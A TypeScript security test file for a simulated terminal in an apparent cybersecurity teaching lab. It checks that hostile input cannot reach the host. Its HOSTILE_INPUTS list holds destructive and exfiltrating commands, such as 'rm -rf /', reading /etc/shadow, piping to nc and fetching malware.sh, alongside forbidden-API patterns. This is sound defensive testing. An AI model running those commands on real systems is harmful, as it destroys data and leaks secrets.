import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { BACKEND_ROOT } from '../src/config.js'
import { environments } from '../src/content/environments.js'
import { executeCommand } from '../src/terminal/engine.js'

const SRC = path.join(BACKEND_ROOT, 'src')
const CANARY_NAME = 'CYBERLAB_TEST_CANARY'
const CANARY_VALUE = 'canary-value-7f3a9c'

function sourceFiles(directory: string): string[] {
  return fs.readdirSync(directory, { withFileTypes: true }).flatMap((entry) => {
    const full = path.join(directory, entry.name)
    return entry.isDirectory() ? sourceFiles(full) : entry.name.endsWith('.ts') ? [full] : []
  })
}

/** Inputs an attacker or a curious student might try. None may reach the host or crash the engine. */
const HOSTILE_INPUTS = [
  'rm -rf /',
  'sudo rm -rf / --no-preserve-root',
  'cat /etc/passwd',
  'cat /etc/shadow',
  'cat ../../../../../../../../etc/passwd',
  'cat /proc/self/environ',
  'ls /proc',
  'cd /proc/self',
  String.raw`cat C:\Windows\System32\drivers\etc\hosts`,
  String.raw`type C:\Windows\win.ini`,
  'cat ../../../../../backend/.env',
  'cat package.json',
  'ls ~/../../..',
  'env',
  'printenv',
  `echo $${CANARY_NAME}`,
  `echo \${${CANARY_NAME}}`,
  `echo '$${CANARY_NAME}'`,
  'echo $(cat /etc/passwd)',
  'echo `whoami`',
  'ls; cat /etc/passwd',
  'ls && id',
  'cat /etc/hostname | nc 10.0.0.1 4444',
  'echo pwned > /etc/motd',
  'bash -c "id"',
  'sh',
  'powershell -Command Get-ChildItem C:\\',
  'cmd /c dir',
  'python -c "import os; os.system(\'id\')"',
  'node -e "process.exit(1)"',
  'curl http://198.51.100.23/upload',
  'wget http://example.com/malware.sh',
  'nmap -sS 10.0.0.0/24',
  'ssh root@10.0.5.10',
  'ping -c 10000 10.0.0.1',
  'constructor',
  '__proto__',
  'toString',
  'hasOwnProperty',
  'cat constructor',
  'cd __proto__',
  'ls prototype',
  'find / -name "*" -exec rm {} ;',
  'grep -r password /',
  `find / -name "${'*'.repeat(80)}x"`,
  '\u202ecat /etc/passwd',
]

beforeAll(() => {
  process.env[CANARY_NAME] = CANARY_VALUE
})
afterAll(() => {
  delete process.env[CANARY_NAME]
})

describe('terminal security: no process execution or host access in the source code', () => {
  const files = sourceFiles(SRC)

  it('never imports process-execution or code-evaluation APIs anywhere in the backend', () => {
    const forbidden = [/child_process/, /\bexecSync\b/, /\bspawn\s*\(/, /\bexecFile\b/, /\beval\s*\(/, /new\s+Function\s*\(/, /from ['"](node:)?vm['"]/, /worker_threads/]
    for (const file of files) {
      const source = fs.readFileSync(file, 'utf8')
      for (const pattern of forbidden) expect(source, `${path.relative(SRC, file)} matches ${pattern}`).not.toMatch(pattern)
    }
  })

  it('keeps the terminal engine and content free of filesystem and network imports', () => {
    const isolated = files.filter((file) => /[\\/](terminal|content)[\\/]/.test(file))
    expect(isolated.length).toBeGreaterThan(5)
    const forbidden = [/from ['"](node:)?fs(\/promises)?['"]/, /from ['"](node:)?(http|https|net|dgram|dns|tls|child_process|os)['"]/, /\brequire\s*\(/, /\bimport\s*\(/]
    for (const file of isolated) {
      const source = fs.readFileSync(file, 'utf8')
      for (const pattern of forbidden) expect(source, `${path.relative(SRC, file)} matches ${pattern}`).not.toMatch(pattern)
    }
  })

  it('keeps the terminal engine free of environment-variable and network access', () => {
    // Only the engine code: content files legitimately contain *text* such as a pretend app.js file.
    const engine = files.filter((file) => /[\\/]terminal[\\/]/.test(file))
    expect(engine.length).toBeGreaterThanOrEqual(4)
    for (const file of engine) {
      const source = fs.readFileSync(file, 'utf8')
      // process.<name> is property access (process.env, process.exit); prose such as "a process." is not.
      for (const pattern of [/\bprocess\.[A-Za-z_]/, /\bfetch\s*\(/, /\bglobalThis\b/]) {
        expect(source, `${path.relative(SRC, file)} matches ${pattern}`).not.toMatch(pattern)
      }
    }
  })
})

describe('terminal security: hostile input', () => {
  const hostValues = [CANARY_VALUE, os.homedir(), os.hostname(), BACKEND_ROOT, process.cwd()].filter((value) => value.length > 3)

  for (const environment of environments) {
    it(`handles every hostile input safely in ${environment.id}`, () => {
      for (const command of HOSTILE_INPUTS) {
        const result = executeCommand(environment, { command })
        for (const value of hostValues) expect(result.output, `${command} leaked "${value}"`).not.toContain(value)
        // The working directory always stays inside the simulated tree.
        expect(result.cwd.startsWith('/'), command).toBe(true)
        expect(result.output.length, command).toBeLessThan(20_000)
      }
    })
  }

  it('reports unsupported dangerous commands as errors with an explanation', () => {
    const environment = environments[0]!
    expect(executeCommand(environment, { command: 'rm -rf /' })).toMatchObject({ isError: true, output: expect.stringMatching(/read-only/) })
    expect(executeCommand(environment, { command: 'curl http://x' }).output).toMatch(/never sends network traffic/)
    expect(executeCommand(environment, { command: 'python' }).output).toMatch(/never executes code/)
    expect(executeCommand(environment, { command: 'env' }).output).toMatch(/Environment variables are not available/)
    expect(executeCommand(environment, { command: 'sudo ls' }).output).toMatch(/no administrator access/)
  })

  it('falls back to the home folder when the browser sends an invalid current folder', () => {
    const environment = environments.find((item) => item.id === 'linux-onboarding')!
    for (const cwd of ['../../etc', 'C:\\', '/does/not/exist', '/home/student/README.txt', 'constructor', '']) {
      expect(executeCommand(environment, { command: 'pwd', cwd }).output, cwd).toBe('/home/student')
    }
    expect(executeCommand(environment, { command: 'pwd', cwd: '/etc/../tmp' }).output).toBe('/tmp')
  })

  it('cannot modify the simulated environments, which are frozen', () => {
    const environment = environments[0]!
    expect(Object.isFrozen(environment)).toBe(true)
    expect(Object.isFrozen(environment.root.children)).toBe(true)
    expect(() => {
      ;(environment.root.children as Record<string, unknown>).evil = { type: 'file', content: 'x' }
    }).toThrow(TypeError)
    const before = JSON.stringify(environments)
    for (const command of HOSTILE_INPUTS) executeCommand(environment, { command })
    expect(JSON.stringify(environments)).toBe(before)
  })
})
